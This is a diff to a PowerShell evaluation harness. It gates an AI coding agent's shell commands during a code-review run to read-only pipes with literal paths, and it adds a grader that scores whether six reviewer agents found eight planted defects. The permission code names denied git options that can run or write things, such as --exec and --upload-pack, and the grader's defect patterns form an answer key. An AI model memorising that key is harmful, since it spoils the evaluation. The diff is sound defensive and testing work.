@@ -2704,7 +2704,188 @@ function Test-DialogBundlePath([string]$Path, [string]$BundleRoot, [string]$Scra
     $rest = $full.Substring($root.Length + 1)
     return -not ($rest.Contains('~') -or $rest.Contains(':'))
 }
-function Get-ReviewPermissionClass($Request, [string]$BundleRoot, [string]$ScratchRoot) {
+# B-467 R2 (.claude/plans/2026-11-20-b467-r2.md, "Runner work" 2): reviewers hash and read with pipes and chains (`Get-FileHash -LiteralPath <file>
+# | Select -ExpandProperty Hash`), which the single-command classes below refuse, and one denied hash command ended a run at CANNOT EXAMINE. On the
+# PowerShell tool a command the single classes refuse is read as a chain of read-only segments joined by `|`, `;`, `&&` or `||`, with `( )`
+# sub-expressions that are chains of their own (depth 3; `$( )` stays denied, as the frozen plan says), `2>&1`, and a property read after a sub-expression (`(Get-FileHash ...).Hash`).
+# A segment is one of: the cmdlets and aliases of $reviewReadOnly (every parameter named, every path argument a literal under the bundle root or
+# the target, or relative to the target without `..`), read-only git (no output, config, -C or no-index form), dotnet build|test|restore (what the
+# run list already allows), or the two review scripts by the single class's own strict rule. Never allowed: any write or other command, a variable,
+# a script block, a backtick, `&`, `<`, `>` but the literal `2>&1`, Remove-Item in a chain. A refusal falls back to what it was: denied.
+$reviewReadOnly = @{
+    'get-content'    = @{ Path = @('-path', '-literalpath'); Value = @('-totalcount', '-head', '-tail', '-encoding', '-erroraction', '-readcount'); Switch = @('-raw'); Positional = 'path' }
+    'get-filehash'   = @{ Path = @('-path', '-literalpath'); Value = @('-algorithm', '-erroraction'); Switch = @(); Positional = 'path'; Algorithm = 'SHA256' }
+    'test-path'      = @{ Path = @('-path', '-literalpath'); Value = @('-pathtype', '-erroraction'); Switch = @(); Positional = 'path' }
+    'get-childitem'  = @{ Path = @('-path', '-literalpath'); Value = @('-filter', '-include', '-exclude', '-depth', '-erroraction'); Switch = @('-recurse', '-file', '-directory', '-force', '-name'); Positional = 'path' }
+    'select-string'  = @{ Path = @('-path', '-literalpath'); Value = @('-pattern', '-context', '-encoding', '-erroraction'); Switch = @('-simplematch', '-casesensitive', '-list', '-quiet', '-notmatch', '-allmatches'); Positional = 'pattern-then-path' }
+    'select-object'  = @{ Path = @(); Value = @('-property', '-expandproperty', '-first', '-last', '-skip', '-skiplast', '-index', '-exclude', '-erroraction'); Switch = @('-unique'); Positional = 'any' }
+    'sort-object'    = @{ Path = @(); Value = @('-property', '-top', '-bottom', '-erroraction'); Switch = @('-descending', '-unique', '-casesensitive'); Positional = 'any' }
+    'measure-object' = @{ Path = @(); Value = @('-property', '-erroraction'); Switch = @('-line', '-word', '-character', '-sum', '-average', '-minimum', '-maximum', '-allstats'); Positional = 'any' }
+    'out-string'     = @{ Path = @(); Value = @('-width'); Switch = @('-stream'); Positional = 'none' }
+    'write-output'   = @{ Path = @(); Value = @(); Switch = @('-nonewline'); Positional = 'any' }
+    'write-host'     = @{ Path = @(); Value = @(); Switch = @('-nonewline'); Positional = 'any' }
+}
+$reviewAlias = @{ 'select' = 'select-object'; 'sort' = 'sort-object'; 'measure' = 'measure-object'; 'gc' = 'get-content'; 'cat' = 'get-content'; 'type' = 'get-content'; 'ls' = 'get-childitem'; 'dir' = 'get-childitem'; 'gci' = 'get-childitem'; 'sls' = 'select-string'; 'echo' = 'write-output' }
+$reviewGitSub = @('status', 'diff', 'log', 'show', 'rev-parse', 'ls-files', 'cat-file', 'rev-list', 'ls-tree', 'branch')
+function Find-ReviewParen([string]$Text, [int]$Open) {
+    $depth = 0; $quote = ''
+    for ($i = $Open; $i -lt $Text.Length; $i++) {
+        $c = [string]$Text[$i]
+        if ($quote) { if ($c -ceq $quote) { $quote = '' }; continue }
+        if ($c -ceq "'" -or $c -ceq '"') { $quote = $c; continue }
+        if ($c -ceq '(') { $depth++ } elseif ($c -ceq ')') { $depth--; if ($depth -eq 0) { return $i } }
+    }
+    return -1
+}
+function Test-ReviewPathArg([string]$Value, $Ctx) {
+    if (-not $Value -or $Value.Contains('@SUB@') -or $Value.Contains('$') -or $Value.Contains('"') -or $Value.Contains("'")) { return $false }
+    # A comma makes an array of paths (`a,\Windows\win.ini`); a device name (CON, NUL, COM1 ..., with or without an extension) is not a file.
+    if ($Value.Contains(',')) { return $false }
+    foreach ($seg in ($Value -split '[\\/]')) { if ($seg.Split('.')[0].Trim() -imatch '^(CON|PRN|AUX|NUL|COM[1-9]|LPT[1-9])$') { return $false } }
+    if ([IO.Path]::IsPathRooted($Value)) {
+        if (Test-DialogBundlePath $Value $Ctx.BundleRoot $Ctx.ScratchRoot -AllowRoot) { return $true }
+        if (-not $Ctx.TargetRoot -or $Value.Contains('..') -or $Value.Contains('~')) { return $false }
+        try { $full = [IO.Path]::GetFullPath($Value); $base = [IO.Path]::GetFullPath($Ctx.TargetRoot) } catch { return $false }
+        return (Test-DialogUnder $full $base) -and -not $full.Substring([Math]::Min($full.Length, $base.TrimEnd('\', '/').Length)).Contains(':')
+    }
+    return -not ($Value.Contains('..') -or $Value.Contains('~') -or $Value.Contains(':') -or $Value.StartsWith('/') -or $Value.StartsWith('\'))
+}
+function Test-ReviewGitSegment([string[]]$Tokens, $Ctx) {
+    if ($Tokens.Count -lt 2 -or $Tokens[1].ToLowerInvariant() -notin $reviewGitSub) { return $false }
+    $sub = $Tokens[1].ToLowerInvariant(); $afterDashes = $false
+    for ($i = 2; $i -lt $Tokens.Count; $i++) {
+        $t = $Tokens[$i]
+        if ($t.Contains('$') -or $t.Contains('@SUB@') -or $t.Contains('"') -or $t.Contains("'")) { return $false }
+        if ($afterDashes) { if (-not (Test-ReviewPathArg $t $Ctx)) { return $false }; continue }
+        if ($t -ceq '--') { $afterDashes = $true; continue }
+        if ($t -cmatch '^-[cCoO]$' -or $t -imatch '^--(output|exec|upload-pack|receive-pack|open-files-in-pager|no-index|ext-diff|git-dir|work-tree|namespace|config-env)(=|$)') { return $false }
+        if ($sub -eq 'branch' -and $t -notin @('--show-current', '--list', '-a', '-r', '-v', '--all', '--remotes')) { return $false }
+        if (-not $t.StartsWith('-') -and ([IO.Path]::IsPathRooted($t) -or ($t.Contains('..') -and ($t.Contains('/') -or $t.Contains('\'))))) { return $false }
+    }
+    return $true
+}
+function Test-ReviewSegment([string]$Segment, $Ctx) {
+    $s = $Segment.Trim()
+    if (-not $s) { return $true }
+    if ($s -cmatch '^@SUB@(\.[A-Za-z_][A-Za-z0-9_]*)*$') { return $true }
+    $raw = @([regex]::Matches($s, '"[^"]*"|''(?:[^'']|'''')*''|\S+') | ForEach-Object { $_.Value })
+    $tokens = @($raw | ForEach-Object {
+            if ($_.Length -ge 2 -and $_[0] -ceq '"' -and $_[-1] -ceq '"') { $_.Substring(1, $_.Length - 2) }
+            elseif ($_.Length -ge 2 -and $_[0] -ceq "'" -and $_[-1] -ceq "'") { $_.Substring(1, $_.Length - 2).Replace("''", "'") }
+            elseif ($_.Contains('"') -or $_.Contains("'")) { $null }
+            else { $_ } })
+    if (@($tokens | Where-Object { $null -eq $_ }).Count -or $raw[0] -match '^["'']') { return $false }
+    $name = $tokens[0].ToLowerInvariant()
+    if ($reviewAlias.ContainsKey($name)) { $name = $reviewAlias[$name] }
+    if ($name -ceq 'pwsh') {
+        $single = Get-ReviewPermissionClassSingle ([pscustomobject]@{ tool_name = 'PowerShell'; input = [pscustomobject]@{ command = $s } }) $Ctx.BundleRoot $Ctx.ScratchRoot
+        if ($single -notin @('scope-capture', 'weakening-scan')) { return $false }
+        $Ctx.Script = $true
+        return $true
+    }
+    if ($name -ceq 'git') { return Test-ReviewGitSegment $tokens $Ctx }
+    if ($name -ceq 'dotnet') {
+        if ($tokens.Count -lt 2 -or $tokens[1].ToLowerInvariant() -notin @('build', 'test', 'restore')) { return $false }
+        # Only a fixed argument list: MSBuild properties, loggers, output dirs, sources and targets all run or write something.
+        $files = 0
+        for ($i = 2; $i -lt $tokens.Count; $i++) {
+            $t = $tokens[$i]
+            if ($t -in @('--no-restore', '--no-build', '--nologo')) { continue }
+            if ($t -in @('-c', '--configuration')) { if ($i + 1 -ge $tokens.Count -or $tokens[$i + 1] -cnotin @('Debug', 'Release')) { return $false }; $i++; continue }
+            if ($t -in @('-v', '--verbosity')) { if ($i + 1 -ge $tokens.Count -or $tokens[$i + 1] -cnotin @('q', 'm', 'quiet', 'minimal')) { return $false }; $i++; continue }
+            if ($t -cmatch '^[A-Za-z0-9_][A-Za-z0-9_.\-/\\]*\.(sln|slnx|csproj)$' -and -not [IO.Path]::IsPathRooted($t) -and (Test-ReviewPathArg $t $Ctx)) { $files++; continue }
+            return $false
+        }
+        return $files -le 1
+    }
+    if (-not $reviewReadOnly.ContainsKey($name)) { return $false }
+    $spec = $reviewReadOnly[$name]
+    $positional = 0
+    $patternNamed = $tokens -contains '-pattern'
+    for ($i = 1; $i -lt $tokens.Count; $i++) {
+        $t = $tokens[$i]
+        if ($t -cmatch '^-[A-Za-z]+$') {
+            $flag = $t.ToLowerInvariant()
+            if ($flag -in $spec.Switch) { continue }
+            if ($flag -in $spec.Path) { if ($i + 1 -ge $tokens.Count -or -not (Test-ReviewPathArg $tokens[$i + 1] $Ctx)) { return $false }; $i++; continue }
+            if ($flag -in $spec.Value) {
+                if ($i + 1 -ge $tokens.Count -or $tokens[$i + 1].Contains('$')) { return $false }
+                if ($flag -in @('-erroraction', '-warningaction') -and $tokens[$i + 1] -cnotmatch '^(SilentlyContinue|Stop|Continue|Ignore)$') { return $false }
+                if ($spec.Algorithm -and $flag -ceq '-algorithm' -and $tokens[$i + 1] -ine $spec.Algorithm) { return $false }
+                $i++; continue
+            }
+            return $false
+        }
+        if ($t.StartsWith('-') -and $t -cnotmatch '^-\d+$') { return $false }
+        $positional++
+        switch ($spec.Positional) {
+            'path' { if (-not (Test-ReviewPathArg $t $Ctx)) { return $false } }
+            'pattern-then-path' { if (($positional -gt 1 -or $patternNamed) -and -not (Test-ReviewPathArg $t $Ctx)) { return $false } }
+            'none' { return $false }
+        }
+    }
+    return $true
+}
+function Test-ReviewChain([string]$Text, $Ctx, [int]$Depth) {
+    if ($Depth -gt 3 -or -not $Text.Trim()) { return $false }
+    $segments = [Collections.Generic.List[string]]::new()
+    $sb = [Text.StringBuilder]::new(); $quote = ''; $i = 0; $n = $Text.Length; $pipedAt = @{}
+    while ($i -lt $n) {
+        $c = [string]$Text[$i]
+        if ($c -ceq '`') { return $false }
+        if ($quote -ceq "'") { [void]$sb.Append($c); if ($c -ceq "'") { $quote = '' }; $i++; continue }
+        $isSub = $false
+        if ($c -ceq '$') { return $false }  # `$(` stays denied (frozen plan: no `$()`); only a bare `( )` sub-expression is read
+        elseif ($c -ceq '(' -and -not $quote) { $isSub = $true; $open = $i }
+        if ($isSub) {
+            $close = Find-ReviewParen $Text $open
+            if ($close -lt 0 -or -not (Test-ReviewChain $Text.Substring($open + 1, $close - $open - 1) $Ctx ($Depth + 1))) { return $false }
+            [void]$sb.Append('@SUB@'); $i = $close + 1; continue
+        }
+        if ($quote) { [void]$sb.Append($c); if ($c -ceq $quote) { $quote = '' }; $i++; continue }
+        switch -CaseSensitive ($c) {
+            { $_ -ceq '"' -or $_ -ceq "'" } { $quote = $c; [void]$sb.Append($c); $i++ }
+            { $_ -in @('{', '}', '<', ')') } { return $false }
+            '@' { if ($i + 1 -lt $n -and $Text[$i + 1] -match '[A-Za-z_]') { return $false }; [void]$sb.Append($c); $i++ }  # splatting (@PROFILE)
+            '>' {
+                if ($Text.Substring($i).StartsWith('>&1') -and $sb.Length -gt 0 -and $sb[$sb.Length - 1] -ceq '2' -and ($sb.Length -eq 1 -or [char]::IsWhiteSpace($sb[$sb.Length - 2]))) { [void]$sb.Remove($sb.Length - 1, 1); $i += 3 } else { return $false }
+            }
+            { $_ -in @(';', "`n", "`r") } { $segments.Add($sb.ToString()); [void]$sb.Clear(); $i++ }
+            '|' { $segments.Add($sb.ToString()); [void]$sb.Clear(); if ($i + 1 -lt $n -and $Text[$i + 1] -ceq '|') { $i += 2 } else { $pipedAt[$segments.Count] = $true; $i++ } }
+            '&' { if ($i + 1 -lt $n -and $Text[$i + 1] -ceq '&') { $segments.Add($sb.ToString()); [void]$sb.Clear(); $i += 2 } else { return $false } }
+            default { [void]$sb.Append($c); $i++ }
+        }
+    }
+    if ($quote) { return $false }
+    $segments.Add($sb.ToString())
+    if (-not @($segments | Where-Object { $_.Trim() }).Count) { return $false }
+    foreach ($segment in $segments) { if (-not (Test-ReviewSegment $segment $Ctx)) { return $false } }
+    # H8: piped input is not a path argument, yet Get-ChildItem, Test-Path and Get-FileHash bind a piped string as a path and Get-Content binds
+    # a piped object's Path property. A pipe into one of them is denied when an upstream segment may emit arbitrary strings or file contents.
+    $taint = $false
+    for ($k = 0; $k -lt $segments.Count; $k++) {
+        $text = $segments[$k].Trim()
+        if (-not $text) { continue }
+        if (-not $pipedAt.ContainsKey($k)) { $taint = $false }
+        $name = if ($text.StartsWith('@SUB@')) { '@sub' } else { ([regex]::Match($text, '^\S+').Value).ToLowerInvariant() }
+        if ($reviewAlias.ContainsKey($name)) { $name = $reviewAlias[$name] }
+        if ($pipedAt.ContainsKey($k) -and $taint -and $name -in @('get-childitem', 'test-path', 'get-filehash', 'get-content')) { return $false }
+        if ($name -in @('get-childitem', 'test-path', 'get-filehash', 'measure-object')) { $taint = $false }
+        elseif ($name -in @('select-object', 'sort-object', 'out-string')) { if ($name -ceq 'select-object' -and $text -imatch '-expandproperty\s+hash\s*$') { $taint = $false } }
+        else { $taint = $true }  # write-output, write-host, get-content, select-string, git, dotnet, a script, a sub-expression
+    }
+    return $true
+}
+function Get-ReviewPermissionClass($Request, [string]$BundleRoot, [string]$ScratchRoot, [string]$TargetRoot) {
+    # PowerShell reads U+2018-U+201E as quotes and U+2013-U+2015 as a dash; any character outside printable ASCII (tab, CR, LF aside) is refused.
+    if ([string]$Request.tool_name -in @('PowerShell', 'Bash') -and [string]$Request.input.command -cmatch '[^\x20-\x7E\t\r\n]') { return 'none' }
+    $class = Get-ReviewPermissionClassSingle $Request $BundleRoot $ScratchRoot
+    if ($class -ne 'none' -or -not $BundleRoot -or [string]$Request.tool_name -ne 'PowerShell') { return $class }
+    $ctx = @{ BundleRoot = $BundleRoot; ScratchRoot = $ScratchRoot; TargetRoot = $TargetRoot; Script = $false }
+    if (Test-ReviewChain ([string]$Request.input.command) $ctx 0) { return $(if ($ctx.Script) { 'chain' } else { 'read-only' }) }
+    return 'none'
+}
+function Get-ReviewPermissionClassSingle($Request, [string]$BundleRoot, [string]$ScratchRoot) {
     if (-not $BundleRoot) { return 'none' }
     $tool = [string]$Request.tool_name
     if ($tool -in @('Bash', 'PowerShell')) {
@@ -2755,6 +2936,137 @@ function Get-ReviewPermissionClass($Request, [string]$BundleRoot, [string]$Scrat
     }
     return 'none'
 }
+# B-467 R2 (.claude/plans/2026-11-20-b467-r2.md, "Runner work" 1): the /review run's tree. The subject (meta/eval-fixtures/b467-review/subject,
+# three files, sha256 manifest beside it) is copied in uncommitted over a tree whose target patch (arm O) is a commit of its own, so `git
+# status` lists the subject and nothing else in both arms. The patch must be exactly `+omitClaudeMd: true` in the six reviewer agent files
+# (the plan's check before any run); the manifest is verified before a byte is copied; a status that lists anything else is refused.
+$b467Reviewers = @('convention-check', 'debt-radar', 'bloat-radar', 'solid-check', 'test-critic', 'security-auditor')
+function Get-OmitClaudeMdPatchRefusal([string]$PatchPath) {
+    $want = @($b467Reviewers | ForEach-Object { ".claude/agents/$_.md" } | Sort-Object)
+    $named = @(Get-TargetPatchPaths $PatchPath)
+    if (($named -join '|') -cne ($want -join '|')) { return "$(Split-Path -Leaf $PatchPath) names $($named -join ', '), not exactly the six reviewer agent files." }
+    $changed = @([IO.File]::ReadAllLines($PatchPath) | Where-Object { $_ -match '^[+-]' -and $_ -notmatch '^(\+\+\+|---) ' })
+    if ($changed.Count -ne 6 -or @($changed | Where-Object { $_ -cne '+omitClaudeMd: true' }).Count) { return "$(Split-Path -Leaf $PatchPath) changes lines other than six of '+omitClaudeMd: true' (one per file)." }
+    return $null
+}
+function Initialize-ReviewSubject([string]$Target, [string]$SubjectRoot, [string]$PatchPath) {
+    $entries = @([IO.File]::ReadAllLines("$SubjectRoot.sha256") | Where-Object { $_.Trim() })
+    foreach ($entry in $entries) {
+        $file = Join-Path $SubjectRoot $entry.Substring(66)
+        if ($entry.Length -le 66 -or -not (Test-Path -LiteralPath $file -PathType Leaf) -or (Get-FileHash -LiteralPath $file -Algorithm SHA256).Hash.ToLowerInvariant() -cne $entry.Substring(0, 64)) { throw "B-467 subject: $($entry.Substring(66)) does not match the frozen manifest $SubjectRoot.sha256." }
+    }
+    if ($PatchPath) {
+        $refusal = Get-OmitClaudeMdPatchRefusal $PatchPath
+        if ($refusal) { throw "B-467 target patch: $refusal" }
+        Invoke-TargetPatch $Target $PatchPath | Out-Null
+        git -C $Target add -A
+        git -C $Target commit --quiet -m 'target patch: omitClaudeMd on the six reviewers'
+        if ($LASTEXITCODE -ne 0) { throw "B-467 target patch: the commit failed (exit $LASTEXITCODE)." }
+    }
+    $dirty = @(git -C $Target status --porcelain=v1 --untracked-files=all)
+    if ($dirty.Count) { throw "B-467 subject: the tree is not clean before the subject is copied in: $($dirty -join '; ')" }
+    foreach ($entry in $entries) {
+        $relative = $entry.Substring(66)
+        New-Item -ItemType Directory -Path (Split-Path -Parent (Join-Path $Target $relative)) -Force | Out-Null
+        Copy-Item -LiteralPath (Join-Path $SubjectRoot $relative) -Destination (Join-Path $Target $relative) -Force
+    }
+    $listed = @(git -C $Target status --porcelain=v1 --untracked-files=all | ForEach-Object { $_.Substring(3) } | Sort-Object)
+    $wanted = @($entries | ForEach-Object { $_.Substring(66) } | Sort-Object)
+    if (($listed -join '|') -cne ($wanted -join '|')) { throw "B-467 subject: git status lists $(@($listed | Where-Object { $_ -notin $wanted }) -join ', ') beside the subject." }
+    return [int](git -C $Target rev-list --count HEAD)
+}
+
+# B-467 R2 (.claude/plans/2026-11-20-b467-r2.md, "Scoring" and "Validity", frozen): the grader of a /review run on the subject. It reads the final
+# merged report (the last result event's text) and the permission log, and reports per run: valid or why not, per-defect found or missed, other
+# findings (Issues-table rows matching no defect: counted, never scored), rows that match several defects, the reviewers that returned, the cost.
+#   Dk is found when one line of the report names Dk's file stem (no .cs needed) and matches every one of Dk's patterns, case-insensitively;
+#   D8 is found on DEBT-006 alone, on a line under the Issues or the Architecture Notes heading: /review puts debt-radar's entries in Architecture Notes\n#   as DEBT ids (review.md Step 4), so a stem check on that line would make D8 unobservable; a mention under any other heading is not a finding.
+#   Valid only if: the terminal result is success; the final message has a verdict and an Issues section; all six reviewers were dispatched by the
+#   main agent and each returned a report (a tool result that is not the background stub and not an error, or a completed task notification); no
+#   reviewer report, parent message or final message says CANNOT EXAMINE; the permission log holds no denied request.
+$b467Defects = [ordered]@{
+    D1 = @{ Stem = 'CheckoutController'; All = @('interpolat|structured|message template') }
+    D2 = @{ Stem = 'CheckoutController'; All = @('System\.Text', 'unused|remove') }
+    D3 = @{ Stem = 'CheckoutController'; All = @('authorization|bearer|token|credential', 'log') }
+    D4 = @{ Stem = 'EventRegistryTests'; All = @('NotNull|tautolog|freshly|construct') }
+    D5 = @{ Stem = 'EventRegistryTests'; All = @('InvoiceIssued|InlineData|weaken|(remov|delet|drop)\w*.{0,40}(case|row|data)') }
+    D6 = @{ Stem = 'CheckoutController'; All = @('switch|open.?closed|OCP|polymorph|third arm') }
+    D7 = @{ Stem = 'CheckoutController'; All = @('catch|swallow') }
+    D8 = @{ Stem = ''; All = @('DEBT-006'); Sections = '^(Issues|Architecture Notes)\b' }
+}
+# Whether the target's history holds the arm O patch commit (the plan's first-row check: present in O, absent in K).
+function Get-ReviewPatchCommit([string]$Target) {
+    if (-not (Test-Path -LiteralPath (Join-Path $Target '.git'))) { return $false }
+    return [bool](git -C $Target log --grep='target patch: omitClaudeMd' --format=%h -1 2>$null)
+}
+function Get-ReviewRunGrade($Evidence, $Permissions, [bool]$HasPermissionLog) {
+    $final = $Evidence.Final
+    $text = [string]$final.result
+    $why = [Collections.Generic.List[string]]::new()
+    $subtype = [string]$final.subtype
+    if ($final.is_error -or ($subtype -and $subtype -ne 'success')) { $why.Add($(if ($subtype -match 'budget') { 'budget cut' } else { "terminal result $(if ($subtype) { $subtype } else { 'error' })" })) }
+    $calls = @($Evidence.Tools | Where-Object { -not $_.Sidechain -and $_.Name -in @('Task', 'Agent', 'task') -and ([string]$_.Input.subagent_type -in $b467Reviewers -or [string]$_.Input.agent_type -in $b467Reviewers) })
+    $returned = [Collections.Generic.List[string]]::new()
+    $replies = [Collections.Generic.List[string]]::new()
+    foreach ($call in $calls) {
+        $name = if ([string]$call.Input.subagent_type -in $b467Reviewers) { [string]$call.Input.subagent_type } else { [string]$call.Input.agent_type }
+        if ($Evidence.ToolResults.ContainsKey($call.Id)) {
+            $result = $Evidence.ToolResults[$call.Id]
+            $reply = Get-B406ContentText $result.content
+            if ($reply.Trim()) { $replies.Add($reply) }
+            if (-not $result.is_error -and $reply.Trim() -and $reply -notmatch '^\s*Async agent launched successfully') { $returned.Add($name) }
+        }
+        foreach ($note in @($Evidence.Notifications | Where-Object { [string]$_.tool_use_id -eq $call.Id -and ($null -eq $_.status -or $_.status -eq 'completed') })) {
+            if (([string]$note.summary).Trim()) { $returned.Add($name); $replies.Add([string]$note.summary) }
+        }
+    }
+    $missing = @($b467Reviewers | Where-Object { $_ -notin $returned })
+    if ($missing.Count) { $why.Add("reviewers missing: $($missing -join ',')") }
+    $examine = '(?i)\bCANNOT EXAMINE\b'
+    $mainTexts = @($Evidence.Texts | Where-Object { -not $_.Sidechain } | ForEach-Object { $_.Text })
+    if (@($replies | Where-Object { $_ -match $examine }).Count) { $why.Add('CANNOT EXAMINE (a reviewer reply)') }
+    elseif ($text -match $examine -or @($mainTexts | Where-Object { $_ -match $examine }).Count) { $why.Add('CANNOT EXAMINE (the parent)') }
+    if (-not $HasPermissionLog) { $why.Add('no permission log') }
+    else {
+        $denied = @($Permissions | Where-Object { [string]$_.decision -eq 'deny' } | Select-Object -First 1)
+        if ($denied.Count) { $why.Add("permission denied: $($denied[0].tool) $(([string]$denied[0].input).Substring(0, [Math]::Min(60, ([string]$denied[0].input).Length)))") }
+    }
+    if ($text -cnotmatch '(?im)^\W*verdict\b.*\b(APPROVE|REQUEST CHANGES)\b') { $why.Add('no verdict in the final message') }
+    if ($text -cnotmatch '(?im)^\s*#+\s*Issues\b') { $why.Add('no Issues section in the final message') }
+    $lines = @($text -split '\r?\n')
+    $found = @{}; $multi = 0; $matched = @{}; $section = ''
+    for ($n = 0; $n -lt $lines.Count; $n++) {
+        if ($lines[$n] -match '^\s*#+\s*(.+?)\s*$') { $section = $Matches[1] }
+        $hits = @($b467Defects.Keys | Where-Object {
+                $d = $b467Defects[$_]
+                (-not $d.Sections -or $section -imatch $d.Sections) -and (-not $d.Stem -or $lines[$n] -imatch [regex]::Escape($d.Stem)) -and -not @($d.All | Where-Object { $lines[$n] -inotmatch $_ }).Count })
+        foreach ($hit in $hits) { $found[$hit] = $true }
+        if ($hits.Count -gt 1) { $multi++ }
+        if ($hits.Count) { $matched[$n] = $true }
+    }
+    # Other findings: the Issues table's rows that match no defect.
+    $start = -1; $end = $lines.Count
+    for ($n = 0; $n -lt $lines.Count; $n++) {
+        if ($start -lt 0 -and $lines[$n] -imatch '^\s*#+\s*Issues\b') { $start = $n + 1 }
+        elseif ($start -ge 0 -and $lines[$n] -imatch '^\s*#+\s') { $end = $n; break }
+    }
+    $other = 0
+    if ($start -ge 0) {
+        for ($n = $start; $n -lt $end; $n++) {
+            $row = $lines[$n].Trim()
+            if ($row.StartsWith('|') -and $row -notmatch '^\|\s*#\s*\|' -and $row -notmatch '^\|[\s:|-]+$' -and -not $matched.ContainsKey($n)) { $other++ }
+        }
+    }
+    $defects = @($b467Defects.Keys | ForEach-Object { "${_}:$(if ($found.ContainsKey($_)) { 'found' } else { 'missed' })" })
+    $valid = $why.Count -eq 0
+    $cost = if ($null -ne $final.total_cost_usd) { [string]$final.total_cost_usd } else { 'n/a' }
+    [pscustomobject]@{
+        Valid = $valid
+        Found = @($found.Keys | Sort-Object)
+        Detail = "valid=$valid reason=$(if ($valid) { 'none' } else { $why -join '; ' }) found=$($found.Count)/8 defects=$($defects -join ',') other=$other multi=$multi reviewers=$($b467Reviewers.Count - $missing.Count)/6 missing=$(if ($missing.Count) { $missing -join ',' } else { 'none' }) cost=$cost"
+    }
+}
+
 # B-516: a scenario's "allowWrite" (skill-approve) lets an Edit, Write or MultiEdit through on this channel when its file_path, rooted, with
 # no '..' and no 8.3 '~', lies strictly under an entry ending in '/' (a folder relative to the target) or is an entry with no trailing '/'
 # (one file), case-insensitively. This host asks before any write under .claude/ in acceptEdits and refuses it in plain -p whatever the
@@ -2777,6 +3089,8 @@ function Get-WritePermissionClass($Request, [string[]]$AllowWrite, [string]$Root
 # pick (a question it asks is answered with its first option without 'with review'); on Copilot it has no channel and runs as a plain case.
 function Get-DialogPick($Case, [string]$Executor) {
     if (-not $Case.dialog -and $Case.allowWrite -and $Executor -eq 'claude') { return 'go' }
+    # B-467 R2: a reviewRun case is one prompt on the control channel with no question pick: its question tool is denied, the review's permission classes allowed.
+    if (-not $Case.dialog -and $Case.assertion -eq 'reviewRun' -and $Executor -eq 'claude') { return 'none' }
     [string]$Case.dialog
 }
 function Get-DialogAnswer($Request, [string]$Pick, [switch]$CompleteReview, $Log, [string]$BundleRoot, [string]$ScratchRoot, [string[]]$AllowWrite, [string]$WriteRoot) {
@@ -2786,8 +3100,10 @@ function Get-DialogAnswer($Request, [string]$Pick, [switch]$CompleteReview, $Log
         $class = 'question'
         # B-416 (unanswered go-ahead): away and silent act only on the go-ahead question, any question of the call offering a 'with review' option.
         if ($Pick -in @('away', 'silent') -and @($Request.input.questions | ForEach-Object { $_.options } | Where-Object { [string]$_.label -match $b416Loose }).Count) { $class = $Pick }
+        # B-467 R2: no pick at all (a /review run): the question is denied, never answered.
+        if ($Pick -eq 'none') { $class = 'none' }
     }
-    elseif ($isRequest -and $CompleteReview) { $class = Get-ReviewPermissionClass $Request $BundleRoot $ScratchRoot }
+    elseif ($isRequest -and $CompleteReview) { $class = Get-ReviewPermissionClass $Request $BundleRoot $ScratchRoot $WriteRoot }
     elseif ($isRequest -and $AllowWrite) { $class = Get-WritePermissionClass $Request $AllowWrite $WriteRoot }
     if ($null -ne $Log) {
         $in = $Request.input
@@ -2810,7 +3126,7 @@ function Get-DialogAnswer($Request, [string]$Pick, [switch]$CompleteReview, $Log
     if ($class -eq 'none') {
         $message = 'This run does not grant that permission.'
         if ($CompleteReview -and $BundleRoot) {
-            $message = "This request is not approved. Commands the session's allow list covers still run as before. For a review bundle this run also approves, as single commands with literal paths, one per call, no variables, chaining or pipes, only under $BundleRoot : pwsh -NoProfile -File scripts/review-scope.ps1 ... -OutputPath <a new folder under $BundleRoot>; pwsh -NoProfile -File scripts/test-weakening-scan.ps1 -ScopePath <the bundle>; Get-FileHash -LiteralPath <file under $BundleRoot>; Remove-Item -LiteralPath <path under $BundleRoot>; Read, Glob and Grep under $BundleRoot."
+            $message = "This request is not approved. Commands the session's allow list covers still run as before. For a review bundle this run also approves, as single commands with literal paths, one per call, no variables, chaining or pipes, only under $BundleRoot : pwsh -NoProfile -File scripts/review-scope.ps1 ... -OutputPath <a new folder under $BundleRoot>; pwsh -NoProfile -File scripts/test-weakening-scan.ps1 -ScopePath <the bundle>; Get-FileHash -LiteralPath <file under $BundleRoot>; Remove-Item -LiteralPath <path under $BundleRoot>; Read, Glob and Grep under $BundleRoot. Read-only PowerShell may be piped or chained: Get-Content, Get-FileHash, Test-Path, Get-ChildItem, Select-String and read-only git into Select-Object, Sort-Object or Measure-Object, with literal paths only under $BundleRoot or the target."
         }
         return [pscustomobject]@{ behavior = 'deny'; message = $message }
     }
@@ -3559,6 +3875,12 @@ function Get-DialogLaunchRefusal($Case, [string]$Executor, [string[]]$AllowedToo
     if ($Case.allowWrite) {
         if ($Case.dialog -or $Case.followUp -or $Case.completeReview -or $Case.assertion -ne 'skillApprove' -or -not $Case.approveSkill) { return "$($Case.id): an allowWrite case has no dialog, followUp or completeReview, an approveSkill and the skillApprove assertion." }
         if ($Executor -eq 'claude' -and -not $AllowedTools) { return "$($Case.id): an allowWrite case runs on -Executor claude with -AllowedTools (the control channel answers the writes it allows)." }
+        return $null
+    }
+    # B-467 R2: a reviewRun case runs on Claude Code only (its grader reads that transcript), on the control channel with -AllowedTools, and has no dialog, followUp or allowWrite.
+    if ($Case.assertion -eq 'reviewRun') {
+        if ($Case.dialog -or $Case.followUp -or $Case.allowWrite -or -not $Case.completeReview -or -not $Case.subject) { return "$($Case.id): a reviewRun case has a subject and completeReview, and no dialog, followUp or allowWrite." }
+        if ($Executor -ne 'claude' -or -not $AllowedTools) { return "$($Case.id): a reviewRun case runs on -Executor claude with -AllowedTools (the control channel answers the review's permissions)." }
         return $null
     }
     $pick = [string]$Case.dialog
@@ -5451,6 +5773,12 @@ function Test-ScenarioEvidence([string]$Id, [string]$Target, $Transcript, [int]$
         'skill-approve' {
             return Get-SkillApproval $e $Target $script:SkillApproveBefore $(if ($Transcript.PSObject.Properties['Permissions']) { @($Transcript.Permissions) } else { $null })
         }
+        # B-467 R2: a /review run of the frozen subject, graded by Get-ReviewRunGrade (valid or why not, found and missed defects, other findings).
+        'b467-review' {
+            $log = $Transcript.PSObject.Properties['Permissions']
+            $grade = Get-ReviewRunGrade $e $(if ($log) { @($Transcript.Permissions) } else { @() }) ([bool]$log)
